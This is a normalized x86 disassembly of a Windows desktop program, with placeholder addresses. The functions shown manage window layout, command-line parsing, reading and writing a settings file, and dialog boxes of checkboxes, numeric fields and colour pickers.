lea edx [ esp + 0x8 ]
push edx
push eax
call [ GetClientRect@IAT ]
movsx ecx [ rw-data ]
mov edx [ esp + 0x14 ]
movsx eax [ rw-data ]
sub edx ecx
movsx ecx [ rw-data ]
sub edx ecx
sub edx eax
push 0x1
add edx 0x3
push edx
mov edx [ esp + 0x18 ]
add edx 0x2
push edx
add eax ebx
push eax
push 0xffffffff
push esi
call [ MoveWindow@IAT ]
mov ecx [ rw-data ]
call sub_40f190
pop edi
pop ebx
sub_4259e0
sub esp 0x200
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esi + 0x540 ] 0x0
mov [ esi + 0x535 ] 0x1
mov [ esi + 0x534 ] 0x1
mov [ esi + 0x536 ] 0x0
call [ GetCommandLineA@IAT ]
lea edi [ esp + 0x10 ]
call sub_425240
mov edi eax
lea eax [ esi + 0x744 ]
push eax
lea ecx [ esi + 0x541 ]
push ecx
push 0x100
lea edx [ esp + 0x1c ]
push edx
call [ GetFullPathNameA@IAT ]
test edi edi
lea ebp [ esi + 0x641 ]
lea ebx [ esi + 0x748 ]
mov [ ebp ] 0x0
mov [ ebx ] 0x0
mov [ esi + 0x537 ] 0x0
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
mov eax edi
lea edi [ esp + 0x10 ]
call sub_425240
mov al [ esp + 0x10 ]
cmp al 0x2b
je r-xdata
lea eax [ esp + 0x10 ]
push r--data
push eax
call sub_420a00
add esp 0x8
push ebx
push ebp
push 0x100
lea ecx [ esp + 0x1d ]
push ecx
call [ GetFullPathNameA@IAT ]
cmp al 0x2d
jne r-xdata
mov [ esi + 0x537 ] 0x1
sub_425ab0
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi + 0x1 ] 0x3a
mov esi ecx
jne r-xdata
mov eax [ esi + 0x744 ]
push ebx
mov ebx [ lstrcpyA@IAT ]
push edi
push eax
call ebx
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn 0xc
pop ebx
lea eax [ esi + 0x541 ]
pop edi
mov [ esi + 0x74c ] eax
pop esi
retn 0xc
mov eax [ esi + 0x748 ]
test eax eax
je r-xdata
push edi
push eax
call ebx
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
pop ebx
lea eax [ esi + 0x641 ]
pop edi
mov [ esi + 0x74c ] eax
pop esi
retn 0xc
lea ecx [ esi + 0x641 ]
push ecx
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
sub_425b30
push ebx
mov ebx [ SetErrorMode@IAT ]
push ebp
push esi
push edi
push 0x1
mov edi ecx
call ebx
mov esi [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov ebp eax
mov eax [ esp + 0x1c ]
push eax
push esi
push ecx
mov ecx edi
call sub_425ab0
test esi esi
push 0x0
push 0x80
jne r-xdata
cmp esi 0x2
jne r-xdata
push 0x3
push esi
push 0x1
push 0x80000000
jmp r-xdata
cmp esi 0x3
jne r-xdata
push 0x3
jmp r-xdata
push eax
call [ CreateFileA@IAT ]
push ebp
mov esi eax
call ebx
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
push 0x4
push 0x2
jmp r-xdata
push 0x0
push 0x0
push 0x40000000
sub_425bb0
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x1
push 0x0
push r--data
mov ebx ecx
mov [ esp + 0x20 ] 0x0
call sub_425b30
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx 0x14c
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
mov [ ebx + 0x530 ] 0x0
movsx edx [ rw-data ]
push edx
mov ecx rw-data
mov esi 0x1
call sub_40a750
movsx eax [ rw-data ]
push eax
mov ecx rw-data
call sub_40a750
movsx ecx [ rw-data ]
push ecx
mov ecx rw-data
call sub_40a750
mov edx [ ebx + 0x74c ]
push edx
push 0x1d
push 0x0
call sub_421530
add esp 0xc
mov ebp [ ReadFile@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x530
push ebx
push esi
call ebp
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax 0x80000000
mov [ ebx + 0x2a8 ] eax
mov [ ebx + 0x2a4 ] eax
mov [ ebx + 0x2a0 ] eax
mov [ ebx + 0x29c ] eax
push esi
call [ CloseHandle@IAT ]
cmp [ ebx ] 0xbe72c536
jne r-xdata
push esi
mov ecx rw-data
mov [ ebx + 0x540 ] 0x1
call sub_40a8d0
push esi
mov ecx rw-data
call sub_40a8d0
push esi
mov ecx rw-data
call sub_40a8d0
push 0x0
push esi
call [ GetFileSize@IAT ]
mov edi eax
movsx eax [ rw-data ]
lea ecx [ eax + eax * 2 ]
shl ecx 0x1
mov edx 0xfffffac4
sub edx ecx
add edi edx
lea eax [ edi + 0x18 ]
push 0x1
push eax
call sub_429969
add esp 0x8
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push edi
push eax
push esi
mov [ ebx + 0x530 ] eax
call ebp
push esi
call [ CloseHandle@IAT ]
mov esi [ esp + 0x14 ]
jmp r-xdata
mov al [ ebx + 0x3f8 ]
test al al
jne r-xdata
sub_425d10
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
movsx eax [ esi + 0x2be ]
push edi
mov ebx ecx
movsx ebp [ ebx + 0x2c2 ]
push eax
mov ecx rw-data
call sub_402890
mov ecx 0x14c
mov edi ebx
[ edi ] [ esi ]
call sub_418630
call sub_414a90
mov ecx [ rw-data ]
push ecx
call [ DestroyWindow@IAT ]
push 0x0
mov ecx rw-data
call sub_424650
push 0x0
mov ecx rw-data
call sub_4035a0
push 0x0
mov ecx rw-data
call sub_424940
push 0x0
mov ecx rw-data
call sub_424260
push 0x0
mov ecx rw-data
call sub_402550
push 0x0
mov ecx rw-data
call sub_424260
mov esi [ rw-data ]
call sub_425940
push rw-data
call sub_422cb0
movsx edx [ ebx + 0x2c2 ]
add esp 0x4
cmp edx ebp
je r-xdata
mov esi [ rw-data ]
lea esp [ esp ]
mov esi [ rw-data ]
mov ecx esi
call sub_40eea0
mov esi [ esi ]
cmp esi [ rw-data ]
jne r-xdata
mov al [ ebx + 0x41f ]
test al al
pop edi
pop esi
pop ebp
pop ebx
jne r-xdata
push ebp
mov ecx esi
call sub_425020
mov esi [ esi ]
cmp esi [ rw-data ]
jne r-xdata
movsx eax [ rw-data ]
push eax
mov ecx rw-data
call sub_40a750
movsx ecx [ rw-data ]
push ecx
mov ecx rw-data
call sub_40a750
movsx edx [ rw-data ]
push edx
mov ecx rw-data
call sub_40a750
mov ecx [ rw-data ]
call sub_4113e0
retn 0x4
call sub_416480
sub_425e50
sub esp 0x30
push esi
mov esi ecx
mov eax [ esi + 0x744 ]
test eax eax
je r-xdata
pop esi
add esp 0x30
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
push 0x1
push 0x1
push r--data
mov ecx esi
call sub_425b30
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push eax
mov [ esp + 0x10 ] 0x2c
call [ GetWindowPlacement@IAT ]
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
sub edx eax
mov [ esi + 0x29c ] eax
mov eax [ esp + 0x30 ]
sub eax ecx
mov [ esi + 0x2a8 ] eax
mov eax [ esp + 0x10 ]
cmp eax 0x3
mov [ esi + 0x2a0 ] ecx
mov [ esi + 0x2a4 ] edx
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push edi
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x530
push esi
push ebx
call [ WriteFile@IAT ]
mov edi eax
neg edi
sbb edi edi
push ebx
mov ecx rw-data
inc edi
mov [ esi + 0x540 ] 0x1
call sub_40a9b0
push ebx
mov ecx rw-data
call sub_40a9b0
push ebx
mov ecx rw-data
call sub_40a9b0
push ebx
call [ CloseHandle@IAT ]
test edi edi
pop edi
je r-xdata
mov al 0x1
cmp eax 0x2
jne r-xdata
pop ebx
mov edx [ esi + 0x74c ]
push edx
push 0x1e
push 0x1
call sub_421530
add esp 0xc
xor al al
jmp r-xdata
cmp [ esp + 0xc ] 0x2
je r-xdata
mov [ esi + 0x3f7 ] al
sub_425f60
sub esp 0x208
push esi
push edi
push 0x1
push 0x2
push r--data
mov edi ecx
call sub_425b30
mov esi eax
cmp esi 0xffffffff
jne r-xdata
movsx eax [ rw-data ]
push ebx
push ebp
push 0x0
lea ecx [ eax + eax * 2 ]
push 0x0
lea edx [ ecx + ecx + 0x53c ]
push edx
push esi
call [ SetFilePointer@IAT ]
push esi
call [ SetEndOfFile@IAT ]
mov ebp [ WriteFile@IAT ]
mov ebx [ lstrlenA@IAT ]
mov edi 0x8
nop
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x23 ]
push ecx
call ebx
inc eax
push eax
lea edx [ esp + 0x27 ]
push edx
push esi
call ebp
dec edi
jns r-xdata
mov [ esp + 0x1b ] al
pop edi
pop esi
add esp 0x208
retn
mov eax [ edi + 0x74c ]
push eax
push 0x1f
push 0x1
call sub_421530
add esp 0xc
pop edi
pop esi
add esp 0x208
retn
mov edx [ rw-data ]
lea eax [ esp + 0x18 ]
push eax
push 0x0
lea ecx [ edi + 0x4e20 ]
push ecx
push edx
call sub_420fe0
add esp 0x10
test eax eax
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x200
call [ GetCurrentDirectoryA@IAT ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
call ebx
inc eax
push eax
lea eax [ esp + 0x24 ]
push eax
push esi
call ebp
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop ebp
pop ebx
mov eax [ ecx ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov dl [ eax + 0xc ]
test dl dl
mov edi [ eax + 0x90 ]
je r-xdata
cmp eax ecx
je r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push edi
call ebx
inc eax
push eax
push edi
push esi
call ebp
mov ecx [ rw-data ]
mov eax [ esp + 0x10 ]
mov edx [ eax ]
mov [ esp + 0x10 ] edx
mov eax edx
jmp r-xdata
sub_4260b0
sub esp 0x64
push edi
xor eax eax
push 0x0
mov ecx 0x9
lea edi [ esp + 0x8 ]
[ edi ]
mov [ esp + 0x10 ] eax
push 0x0
lea eax [ esp + 0x30 ]
push edx
mov [ esp + 0x10 ] 0x24
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x181
call [ InvalidateRect@IAT ]
lea ecx [ esp + 0x4 ]
push ecx
call [ ChooseColorA@IAT ]
test eax eax
mov eax [ esp + 0x10 ]
pop edi
jne r-xdata
add esp 0x64
retn
mov eax esi
sub_426110
mov eax [ esp + 0x8 ]
sub eax 0x110
push esi
push edi
je r-xdata
mov ecx [ rw-data ]
movzx edx [ ecx + 0x3f8 ]
mov esi [ esp + 0xc ]
mov edi [ CheckDlgButton@IAT ]
push edx
push 0x51e
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x3fa ]
push ecx
push 0x51f
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x402 ]
push eax
push 0x521
push esi
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x3f9 ]
push edx
push 0x520
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x419 ]
push 0x1
add ecx 0x522
push ecx
push esi
call edi
mov edx [ rw-data ]
mov al [ edx + 0x403 ]
neg al
push 0x1
sbb eax eax
add eax 0x526
push eax
push esi
call edi
mov edx [ rw-data ]
mov al [ edx + 0x41b ]
xor ecx ecx
test al al
setne cl
push 0x1
add ecx 0x529
push ecx
push esi
call edi
mov eax [ rw-data ]
movsx ecx [ eax + 0x2c0 ]
push 0x0
push ecx
push 0x527
push esi
call [ SetDlgItemInt@IAT ]
mov eax [ rw-data ]
mov cl [ eax + 0x419 ]
xor edx edx
cmp cl 0x1
sete dl
push edx
dec eax
je r-xdata
movzx eax [ esp + 0x14 ]
cmp eax 0x520
jg r-xdata
sub eax 0x2f0
jne r-xdata
cmp eax 0x522
jl r-xdata
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov esi [ esp + 0xc ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x51e
push esi
call edi
mov ecx [ rw-data ]
push 0x51f
push esi
mov [ ecx + 0x3f8 ] al
call edi
mov edx [ rw-data ]
push 0x521
push esi
mov [ edx + 0x3fa ] al
call edi
mov ecx [ rw-data ]
push 0x520
push esi
mov [ ecx + 0x402 ] al
call edi
mov edx [ rw-data ]
push 0x525
push esi
mov [ edx + 0x3f9 ] al
call edi
mov ecx [ rw-data ]
push 0x52a
push esi
mov [ ecx + 0x403 ] al
call edi
mov edx [ rw-data ]
mov [ edx + 0x41b ] al
mov eax [ rw-data ]
movsx ecx [ eax + 0x2c0 ]
push ecx
push 0x3e8
push 0x5
push 0x527
push esi
call sub_420c60
mov edx [ rw-data ]
add esp 0x14
push 0x522
push esi
mov [ edx + 0x2c0 ] ax
call edi
test eax eax
je r-xdata
cmp eax 0x524
jg r-xdata
mov esi [ esp + 0xc ]
push 0x520
push esi
call [ IsDlgButtonChecked@IAT ]
push eax
push 0x51e
jmp r-xdata
sub eax 0x2
jne r-xdata
push 0x523
push esi
call edi
mov edx [ rw-data ]
test eax eax
sete cl
inc cl
pop edi
mov [ edx + 0x419 ] cl
mov eax 0x1
pop esi
retn 0x10
mov eax [ rw-data ]
pop edi
mov [ eax + 0x419 ] 0x0
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0xc ]
push 0x523
push esi
call [ IsDlgButtonChecked@IAT ]
push eax
jmp r-xdata
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0xc ]
push eax
call [ DestroyWindow@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
push 0x527
sub_4263a0
mov eax [ esp + 0x8 ]
cmp eax 0x401
push esi
push edi
ja r-xdata
cmp eax 0x403
jne r-xdata
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov eax 0x538
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x532
push esi
call edi
mov edx [ rw-data ]
push 0x533
push esi
mov [ edx + 0x3fb ] al
call edi
mov ecx [ rw-data ]
push 0x534
push esi
mov [ ecx + 0x3fc ] al
call edi
mov edx [ rw-data ]
push 0x535
push esi
mov [ edx + 0x3fd ] al
call edi
mov ecx [ rw-data ]
push 0x536
push esi
mov [ ecx + 0x3ff ] al
call edi
mov edx [ rw-data ]
push 0x53c
push esi
mov [ edx + 0x3fe ] al
call edi
mov ecx [ rw-data ]
push 0x53d
push esi
mov [ ecx + 0x408 ] al
call edi
mov edx [ rw-data ]
neg eax
sbb al al
inc al
mov [ edx + 0x42e ] al
mov eax [ rw-data ]
movsx ecx [ eax + 0x2ce ]
push ecx
push 0x2710
push 0x0
push 0x53b
push esi
call sub_420c60
mov edx [ rw-data ]
add esp 0x14
push 0x53a
push esi
mov [ edx + 0x2ce ] ax
call edi
mov ecx [ rw-data ]
pop edi
mov [ ecx + 0x400 ] al
mov eax 0x1
pop esi
retn 0x10
sub eax 0x110
je r-xdata
movzx eax ax
sub eax 0x538
je r-xdata
mov eax [ rw-data ]
movzx ecx [ eax + 0x3fb ]
mov esi [ esp + 0xc ]
mov edi [ CheckDlgButton@IAT ]
push ecx
push 0x532
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x3fc ]
push eax
push 0x533
push esi
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x3fd ]
push edx
push 0x534
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x3ff ]
push ecx
push 0x535
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x3fe ]
push eax
push 0x536
push esi
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x408 ]
push edx
push 0x53c
push esi
call edi
mov ecx [ rw-data ]
mov dl [ ecx + 0x42e ]
xor eax eax
test dl dl
sete al
push eax
push 0x53d
push esi
call edi
mov edx [ rw-data ]
movsx eax [ edx + 0x2ce ]
push 0x0
push eax
push 0x53b
push esi
call [ SetDlgItemInt@IAT ]
mov ecx [ rw-data ]
movzx edx [ ecx + 0x400 ]
push edx
push 0x53a
push esi
call edi
mov eax [ rw-data ]
mov ecx [ eax + 0x2b0 ]
push ecx
push 0x0
push 0x401
push 0x539
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x53c
push esi
call [ IsDlgButtonChecked@IAT ]
push eax
push 0x53b
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
dec eax
jne r-xdata
mov edx [ rw-data ]
mov esi [ edx + 0x2b0 ]
mov edi [ esp + 0xc ]
mov edx edi
call sub_4260b0
mov ecx [ rw-data ]
mov [ ecx + 0x2b0 ] eax
mov edx [ rw-data ]
mov eax [ edx + 0x2b0 ]
push eax
push 0x0
push 0x401
push 0x539
push edi
call [ SendDlgItemMessageA@IAT ]
sub eax 0x4
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi [ esp + 0xc ]
push 0x53c
push esi
call [ IsDlgButtonChecked@IAT ]
push eax
push 0x53b
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
sub_426680
sub esp 0x200
push ebx
push esi
mov esi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0x550
push edi
call esi
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0x0
push 0x147
push 0x553
push edi
call esi
push eax
push 0x148
push 0x553
push edi
call esi
cmp ebx 0x7
je r-xdata
mov eax 0x1
mov esi [ lstrlenA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call esi
cmp eax 0x4
jl r-xdata
xor eax eax
jmp r-xdata
push r--data
lea edx [ esp + 0xc ]
push edx
call esi
lea ecx [ esp + 0xc ]
sub ecx 0x4
add eax ecx
push eax
call sub_431aa6
add esp 0x8
test eax eax
je r-xdata
push eax
push 0x54e
push edi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop esi
pop ebx
add esp 0x200
retn
cmp ebx 0x8
je r-xdata
test ebx ebx
je r-xdata
push 0x554
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
sub_426740
cmp [ esp + 0xc ] 0x4
jne r-xdata
mov eax 0x1
retn 0x10
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
add eax 0x1c
push eax
push 0x0
push 0x143
push 0x546
push ecx
call [ SendDlgItemMessageA@IAT ]
sub_426770
cmp [ esp + 0xc ] 0x4
jne r-xdata
mov eax 0x1
retn 0x10
mov eax [ rw-data ]
mov cl [ eax + 0x42d ]
test cl cl
mov eax [ esp + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
add eax 0x1c
push eax
push 0x0
push 0x143
push 0x553
push ecx
call [ SendDlgItemMessageA@IAT ]
cmp [ eax + 0x17 ] 0x80
jne r-xdata
sub_4267c0
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
push eax
push 0x0
push 0x158
push esi
push edi
call ebx
push 0x0
push eax
push 0x14e
push esi
push edi
call ebx
pop ebx
retn
sub_4267f0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
push esi
push edi
je r-xdata
mov edx [ rw-data ]
movzx eax [ edx + 0x404 ]
mov ebx [ esp + 0x10 ]
mov esi [ CheckDlgButton@IAT ]
push ebp
push eax
push 0x55a
push ebx
call esi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x405 ]
push 0x1
add edx 0x55d
push edx
push ebx
call esi
mov esi [ GetDlgItem@IAT ]
push 0x55b
push ebx
call esi
push 0x55c
push ebx
mov ebp eax
call esi
mov edi [ SendMessageA@IAT ]
mov [ esp + 0x14 ] eax
mov esi rw-data
lea esp [ esp ]
cmp eax 0x401
je r-xdata
add esi 0x4
cmp esi rw-data
jl r-xdata
mov ecx [ esi ]
push ecx
call sub_420ca0
mov edx [ esp + 0x18 ]
add esp 0x4
push eax
push 0x0
push 0x143
push edx
call edi
mov esi [ esp + 0x10 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x55a
push esi
call edi
mov ecx [ rw-data ]
mov ebx [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0x55b
push esi
mov [ ecx + 0x404 ] al
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov eax [ esi ]
push eax
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push ebp
call edi
cmp esi rw-data
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x40c ]
cmp al 0x1
jne r-xdata
add eax 0x5
mov eax 0x1
jmp r-xdata
movzx eax al
sub eax 0x5
xor eax eax
jmp r-xdata
push 0x55e
push esi
call edi
mov ecx [ rw-data ]
test eax eax
sete al
inc al
mov [ ecx + 0x405 ] al
mov edx [ rw-data ]
mov [ edx + 0x405 ] 0x0
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x147
push 0x55c
push esi
mov [ edx + 0x40c ] al
call ebx
mov ecx [ rw-data ]
push 0x55d
add al 0x6
push esi
mov [ ecx + 0x40b ] al
call edi
test eax eax
je r-xdata
push 0x0
push eax
push 0x14e
push ebp
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x40b ]
mov eax [ esp + 0x14 ]
push 0x0
sub edx 0x6
push edx
push 0x14e
push eax
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x40d ]
mov esi [ CheckDlgButton@IAT ]
push edx
push 0x560
push ebx
call esi
mov eax [ rw-data ]
movzx ecx [ eax + 0x40e ]
push ecx
push 0x561
push ebx
call esi
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
push 0x560
push esi
call edi
mov edx [ rw-data ]
push 0x561
push esi
mov [ edx + 0x40d ] al
call edi
mov ecx [ rw-data ]
pop edi
pop esi
mov [ ecx + 0x40e ] al
mov eax 0x1
pop ebx
retn 0x10
sub_426a20
mov eax [ esp + 0x8 ]
cmp eax 0x401
push esi
push edi
ja r-xdata
cmp eax 0x403
jne r-xdata
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov eax 0x574
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x577
push esi
call edi
mov ecx [ rw-data ]
push 0x56e
push esi
mov [ ecx + 0x416 ] al
call edi
mov edx [ rw-data ]
push 0x575
push esi
mov [ edx + 0x41d ] al
call edi
mov ecx [ rw-data ]
push 0x576
push esi
mov [ ecx + 0x421 ] al
call edi
mov edx [ rw-data ]
push 0x579
push esi
mov [ edx + 0x422 ] al
call edi
mov ecx [ rw-data ]
push 0x57a
push esi
mov [ ecx + 0x41c ] al
call edi
mov edx [ rw-data ]
push 0x571
push esi
mov [ edx + 0x41e ] al
call edi
test eax eax
jne r-xdata
sub eax 0x110
je r-xdata
movzx eax ax
sub eax 0x571
je r-xdata
push 0x572
push esi
call edi
mov edx [ rw-data ]
test eax eax
sete cl
inc cl
pop edi
mov [ edx + 0x420 ] cl
mov eax 0x1
pop esi
retn 0x10
mov eax [ rw-data ]
pop edi
mov [ eax + 0x420 ] 0x0
mov eax 0x1
pop esi
retn 0x10
mov eax [ rw-data ]
movzx ecx [ eax + 0x41d ]
mov esi [ esp + 0xc ]
mov edi [ CheckDlgButton@IAT ]
push ecx
push 0x56e
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x420 ]
push eax
push 0x571
push esi
call edi
mov edx [ rw-data ]
mov al [ edx + 0x420 ]
xor ecx ecx
cmp al 0x1
setne cl
push 0x1
add ecx 0x572
push ecx
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x421 ]
push ecx
push 0x575
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x422 ]
push eax
push 0x576
push esi
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x416 ]
push edx
push 0x577
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x41c ]
push ecx
push 0x579
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x41e ]
push eax
push 0x57a
push esi
call edi
push 0x0
push 0x571
push 0x111
push esi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx + 0x2b4 ]
push edx
push 0x0
push 0x401
push 0x578
push esi
call [ SendDlgItemMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
dec eax
jne r-xdata
mov edi [ esp + 0xc ]
push ebx
mov ebx [ EnableWindow@IAT ]
push ebp
mov ebp [ IsDlgButtonChecked@IAT ]
mov esi 0x572
sub eax 0x3
je r-xdata
mov eax [ esp + 0x14 ]
push 0x571
push edi
call ebp
push eax
push esi
push edi
call [ GetDlgItem@IAT ]
push eax
call ebx
inc esi
cmp esi 0x576
jle r-xdata
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
retn 0x10
mov ecx [ rw-data ]
mov edi [ esp + 0xc ]
mov esi [ ecx + 0x2b4 ]
mov edx edi
call sub_4260b0
mov edx [ rw-data ]
mov [ edx + 0x2b4 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x2b4 ]
push ecx
push 0x0
push 0x401
push 0x578
push edi
call [ SendDlgItemMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
sub eax 0x7
je r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_4164a0
add esp 0x4
pop edi
mov eax 0x1
pop esi
retn 0x10
sub_426cf0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
push edi
je r-xdata
mov esi [ esp + 0xc ]
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
xor edi edi
jmp r-xdata
cmp eax 0x401
je r-xdata
movsx ecx [ edi + rw-data ]
push ecx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x58c
push esi
call ebx
add edi 0x2
cmp edi 0x14
jb r-xdata
mov eax [ rw-data ]
movsx ecx [ eax + 0x2bc ]
mov esi [ esp + 0xc ]
push ecx
push 0x400
push 0x10
push 0x582
push esi
call sub_420c60
mov edx [ rw-data ]
mov [ edx + 0x2bc ] ax
mov eax [ rw-data ]
movsx ecx [ eax + 0x2be ]
push ecx
push 0x7d0
push 0xa
push 0x583
push esi
call sub_420c60
mov edx [ rw-data ]
mov [ edx + 0x2be ] ax
mov eax [ rw-data ]
movsx ecx [ eax + 0x2c2 ]
push ecx
push 0x3e8
push 0x3
push 0x584
push esi
call sub_420c60
mov edx [ rw-data ]
mov [ edx + 0x2c2 ] ax
mov eax [ rw-data ]
movsx ecx [ eax + 0x2c4 ]
push ecx
push 0x1b58
push 0x64
push 0x586
push esi
call sub_420c60
mov edx [ rw-data ]
mov [ edx + 0x2c4 ] ax
mov eax [ rw-data ]
movsx ecx [ eax + 0x2d0 ]
add esp 0x50
push ecx
push 0x7530
push 0x0
push 0x58b
push esi
call sub_420c60
mov edx [ rw-data ]
mov [ edx + 0x2d0 ] ax
mov eax [ rw-data ]
mov ecx [ eax + 0x2ac ]
push ecx
push 0x7fffffff
push 0x800
push 0x589
push esi
call sub_420c60
mov edx [ rw-data ]
mov edi [ IsDlgButtonChecked@IAT ]
add esp 0x28
push 0x587
push esi
mov [ edx + 0x2ac ] eax
call edi
mov ecx [ rw-data ]
push 0x588
push esi
mov [ ecx + 0x42c ] al
call edi
mov edx [ rw-data ]
push 0x58a
push esi
mov [ edx + 0x41f ] al
call edi
mov ecx [ rw-data ]
push 0x0
mov [ ecx + 0x415 ] al
push 0x0
push 0x147
push 0x58c
push esi
call [ SendDlgItemMessageA@IAT ]
mov dx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
pop edi
mov [ eax + 0x430 ] dx
mov eax 0x1
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ rw-data ]
mov cx [ edx + 0x430 ]
xor eax eax
jmp r-xdata
cmp [ eax * 2 + rw-data ] cx
je r-xdata
cmp eax 0xa
jne r-xdata
inc eax
cmp eax 0xa
jb r-xdata
push 0x0
push eax
push 0x14e
push 0x58c
push esi
call ebx
mov eax [ rw-data ]
movsx ecx [ eax + 0x2bc ]
mov edi [ SetDlgItemInt@IAT ]
push 0x0
push ecx
push 0x582
push esi
call edi
mov edx [ rw-data ]
movsx eax [ edx + 0x2be ]
push 0x0
push eax
push 0x583
push esi
call edi
mov ecx [ rw-data ]
movsx edx [ ecx + 0x2c2 ]
push 0x0
push edx
push 0x584
push esi
call edi
mov eax [ rw-data ]
movsx ecx [ eax + 0x2c4 ]
push 0x0
push ecx
push 0x586
push esi
call edi
mov edx [ rw-data ]
movsx eax [ edx + 0x2d0 ]
push 0x0
push eax
push 0x58b
push esi
call edi
mov ecx [ rw-data ]
mov edx [ ecx + 0x2ac ]
push 0x0
push edx
push 0x589
push esi
call edi
mov eax [ rw-data ]
movzx ecx [ eax + 0x42c ]
mov edi [ CheckDlgButton@IAT ]
push ecx
push 0x587
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x41f ]
push eax
push 0x588
push esi
call edi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x415 ]
push edx
push 0x58a
push esi
